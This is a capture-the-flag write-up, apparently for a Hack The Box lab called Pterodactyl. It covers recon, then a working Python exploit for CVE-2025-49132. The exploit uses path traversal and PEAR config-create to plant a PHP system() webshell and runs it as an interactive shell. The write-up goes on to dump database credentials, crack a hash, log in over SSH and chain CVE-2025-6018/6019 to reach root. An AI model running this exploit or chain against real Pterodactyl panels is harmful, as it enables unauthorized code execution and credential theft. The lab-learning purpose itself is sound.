
# Pterodactyl Machine: Complete Work-through

Hello everyone! This is your helpful guide to mastering the **Pterodactyl** machine. If you want to learn more about what Pterodactyl is and how the system works, check out the official documentation.

## 1. Initial Reconnaissance (Nmap Scan)

Let's start with an Nmap scan to identify open ports and services:

Bash

```
nmap -sV -sC 10.129.4.120
```

**Results:**

- **SSH (22)**: Standard remote access.
    
- **HTTP (80)**: Web server.
    
- **HTTPS-Proxy (8080)**: Wings service.
    
- **HTTPS (443)**: Domain server.
    

### Web Enumeration

Let's add the domain to our `/etc/hosts` file:

Bash

```
echo "10.129.4.120 pterodactyl.htb" | sudo tee -a /etc/hosts
```

After checking the HTTP server, we found a single page related to a Minecraft server. Subdomain fuzzing is necessary to find the Pterodactyl panel.

Bash

```
gobuster vhost -u http://pterodactyl.htb -w common.txt
```

Found the **panel** subdomain. Add it to `/etc/hosts`: `10.129.4.120 panel.pterodactyl.htb`

---

## 2. Exploitation: CVE-2025-49132 (LFI to RCE)

Research led to **CVE-2025-49132**, an LFI vulnerability in the Pterodactyl panel that can lead to RCE via PHP PEAR.

### Custom Interactive Exploit

I developed a refined version of the PoC to provide an interactive-like shell experience:

Python

```
"""
This is just a proof of concept of CVE-2025-49132 and the original author of this cve is 0xtensho
I tired my self to make the exploite easier and useful for reediting it 
"""

# importing modules
import subprocess
import os
import sys

paner=r"""
__________   __                          .___              __  .__          
\______   \_/  |_  ___________  ____   __| _/____    _____/  |_|  | ___.__. 
 |     ___/\   __\/ __ \_  __ \/  _ \ / __ |\__  \ _/ ___\   __\  |<   |  | 
 |    |     |  | \  ___/|  | \(  <_> ) /_/ | / __ \\  \___|  | |  |_\___  | 
 |____|     |__|  \___  >__|   \____/\____ |(____  /\___  >__| |____/ ____| 
                      \/                  \/     \/     \/          \/      
"""

class CVE_2025_49132():
    def __init__(self,host,pearpath):
        self.host = host
        self.pearpath = pearpath

    def __str__(self):
        return f"[!] host {self.ip} pearpath {self.pearpath}"

    def exploit(self,command):
        """main exploit function

        arguments:
            command: the command you will have to excute
        """
        command = command.replace(' ','\\$\\\\{IFS\\\\}')
        #injecting your command
        subprocess.run(f"curl \"http://{self.host}/locales/locale.json?+config-create+/&locale=../../../../..{self.pearpath}&namespace=pearcmd&/<?=print('---DELMITER---');system('{command}');print('---DELMITER---');?>+/tmp/payload.php\"",capture_output=True,text=True,shell=True)
        # excuting the command
        output = subprocess.run(f"curl \"http://{self.host}/locales/locale.json?locale=../../../../../tmp&namespace=payload\"",capture_output=True,text=True,shell=True)
        resault = output.stdout.split("---DELMITER---")[1].strip()
        print(resault)


# if the file woring localy
if __name__ == "__main__":
    print(paner+"\n"+"="*100)
    while True:
        pterodactly = CVE_2025_49132("panel.pterodactyl.htb","/usr/share/php/PEAR")
        command = input(":~$ ")

        # adding interactive clear command
        if command == "clear":
            os.system("clear")
            print(paner+"\n"+"="*100)
        elif command == "exit":
            sys.exit(1)
        else:
            pterodactly.exploit(command)
```

---

## 3. Lateral Movement & Database Access

Using the shell, we found MySQL database credentials. Since the MySQL port is only listening on `localhost`, we interact with it directly from our shell:

Bash

```
mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 -P 3306 panel
```

### Extracting User Credentials

In the `panel` database, the `users` table contains account details and password hashes:

SQL

```
USE panel;
SELECT username, password FROM users;
```

We obtained a hash for the user `phileasfogg3`. Using **John the Ripper**:

Bash

```
john --wordlist=rockyou.txt hash.txt
```

**Cracked Password:** `!QAZ2wsx`

We can now log in via SSH:

Bash

```
ssh phileasfogg3@pterodactyl.htb
```

**User Flag:** `cat user.txt`

---

## 4. Privilege Escalation (PrivEsc)

Enumeration revealed a security announcement mail regarding the `udisks` tool.

### CVE-2025-6019 & CVE-2025-6018

I used a PoC for **CVE-2025-6019**.

1. Create an `xfs.image` locally.
    
2. Upload it to the victim machine.
    
3. Fix the `mkfs` path issue:
    
    Bash
    
    ```bash
    find / -name mkfs 2>/dev/null
    # Found in /sbin
    PATH=$PATH:/sbin
    ```
    

The exploit failed initially because `allow_active` was not set to `yes`. This requires bypassing the SSH session restriction using **CVE-2025-6018**.

Following the instructions in the [Bugzilla report](https://bugzilla.suse.com/show_bug.cgi?id=1243226), I changed the status to `yes`, allowing the execution of the previous CVE.

**Root Flag:**


```bash
# After successful exploit
whoami
# root
cat /root/root.txt
```
